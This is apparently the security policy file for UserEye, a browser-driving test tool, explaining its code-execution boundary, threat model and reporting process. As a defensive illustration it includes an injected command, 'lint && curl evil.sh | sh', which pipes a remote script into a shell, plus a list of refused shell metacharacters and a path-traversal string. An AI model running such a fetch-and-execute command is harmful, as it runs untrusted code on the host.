# Security policy

## Supported versions

| Version | Supported          |
| ------- | ------------------ |
| 7.x     | :white_check_mark: |
| < 7.0   | :x:                |

Only the latest minor of the current major receives fixes. Upgrade guidance for breaking
changes is documented in `HISTORY.md`.

## Reporting a vulnerability

Please **do not** open a public issue for security problems.

- Preferred: use GitHub's **private vulnerability reporting** (Security → Report a vulnerability)
  on the repository.
- Fallback: e-mail the maintainers at the address listed in the repository's `CODEOWNERS`/profile.

We acknowledge reports within **5 business days** and aim to ship a fix or mitigation within
**30 days** for confirmed high-severity issues. You will be credited in the release notes unless
you ask to remain anonymous.

## The code-execution boundary (URL mode vs. project mode)

This is the single most important thing to understand before pointing UserEye at a
repository you did not write.

| Mode             | Invocation                               | Does UserEye execute code from the target?                                                                                              |
| ---------------- | ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| **URL mode**     | `usereye auto --url https://app.example` | **Never.** UserEye only drives a browser against an already-running application. It reads the DOM; it does not read or run your source. |
| **Project mode** | `usereye auto --project .`               | **Only what you explicitly authorize.** Static analysis is the default.                                                                 |

### What changed in 7.5

Up to 7.4.1, project mode ran commands that came _from the target repository_ —
its `package.json` scripts (`lint`, `format:check`, `typecheck`), the `eslint` /
`prettier` binaries resolved out of its `node_modules`, and with `--install` its
package manager — and it ran them through `child_process.spawn(..., { shell: true })`.
Pointing UserEye at an untrusted clone therefore executed that clone's code, which
contradicted the "safe exploration" promise that is genuinely true of URL mode.

From 7.5 the boundary is explicit and closed by default:

1. **Static by default.** `codeExecution.npmScripts`, `codeExecution.binaries` and
   `codeExecution.install` are all `false`. A bare `--project` run reads files and
   never executes anything from the target.
2. **Opt-in per category.** Authorize deliberately:

   ```bash
   usereye auto --project . --allow-project-commands lint,typecheck
   usereye auto --project . --allow-project-commands all      # scripts + binaries + install
   ```

   Equivalent config: `codeExecution: { npmScripts: true, binaries: true }`.
   Note that `--install` alone is not sufficient — installation additionally
   requires the `install` category, so a config file committed to a repository
   cannot quietly cause a dependency install on someone else's machine.

3. **No shell, ever.** All command execution funnels through `command-runner.js`,
   which tokenizes the command itself and calls `spawn(file, argv, { shell: false })`.
   A command containing `; & | > < \` $ ( )`is **refused**, not escaped — so a
script named`lint && curl evil.sh | sh`cannot be reinterpreted as two commands.
If a legitimate start command genuinely needs shell syntax, start the app
yourself and use`--url`.
The one command the tool runs on its own behalf — `usereye install-browsers`(playwright's CLI) — is also shell-free: it resolves playwright's`cli.js`(or
the npm CLI file) and runs them through`process.execPath`; on Windows the last
resort is `cmd.exe /d /s /c`with a **fixed** argv (allow-listed browser targets
only — nothing user-controlled is interpreted). No`shell:` option is enabled
   anywhere in the codebase; the CI greps for it on every run.
4. **Full audit trail.** Every command UserEye executed _or refused to execute_ is
   recorded in `result.json` under `commandAudit`, with its argv, working
   directory, decision, reason and exit code. `shell` is always `false` there.
   Refused commands also appear as `skipped` checks in the code-quality report —
   visible, and never counted as quality failures.

Run `usereye doctor` to see the boundary currently in effect for a given
configuration before starting a run.

## Threat model — what UserEye is and is not

UserEye is a developer tool that drives **real browsers** against targets **you configure**.
Some properties matter when assessing risk:

- **It navigates where you point it.** `--url`, seed paths and adaptive exploration issue real
  HTTP requests and clicks. Only run it against applications you own or are authorized to test.
  Safety valves exist for this: `blockPaths`, `blockNamePatterns`, `allowWrite` (default off),
  `allowDestructive` (default off), `allowDownloads` (default off) and `minActionDelayMs`
  throttling.
- **Credentials stay local and are redacted.** Values registered as secrets (CLI credentials,
  `registerSecret`, `sensitive: true` fills) are replaced in actions, issues, reports and SARIF;
  sensitive inputs are masked in screenshots and videos. Redaction is best-effort logging
  hygiene — still prefer throwaway test accounts.
- **Artifacts are evidence.** Traces, videos, screenshots and `result.json` may contain page
  content from the target. Treat the artifacts directory with the same care as the data of the
  application you tested.
- **The dashboard is a local, read-only server.** `usereye dashboard` binds to `127.0.0.1` by
  default, serves one run directory and rejects path traversal (`%2e%2e%2f` and friends are
  covered by tests). Do not expose it to untrusted networks.
- **Project mode executes only what you authorize.** See the boundary section above:
  `codeExecution.*` defaults to false, no command is ever passed through a shell, and
  every executed or blocked command is recorded in `result.json` under `commandAudit`.
- **No telemetry and no model calls.** UserEye phones home to nothing; the only network traffic is towards your
  configured target, plus `playwright install` downloading browser binaries from the official
  Playwright CDN when you ask for it.
- **Supply chain.** Published packages are built by GitHub Actions with
  [npm provenance](https://docs.npmjs.com/generating-provenance-statements) (`id-token: write`,
  `environment: npm`); the Docker image pins an exact `mcr.microsoft.com/playwright` tag that CI
  verifies against the lockfile (`scripts/check-playwright-version.js`).

## Scope

In scope: anything that lets a malicious target page or artifact escape the browser sandbox into
the host, exfiltrates registered secrets into reports/artifacts, executes unintended code from
plugins/config discovery, or bypasses the dashboard's traversal protection.

Out of scope: findings from the _target application_ you pointed UserEye at (report those to its
owners), denial-of-service against yourself by scanning a huge site, and issues in upstream
Playwright/Chromium — please report those upstream.
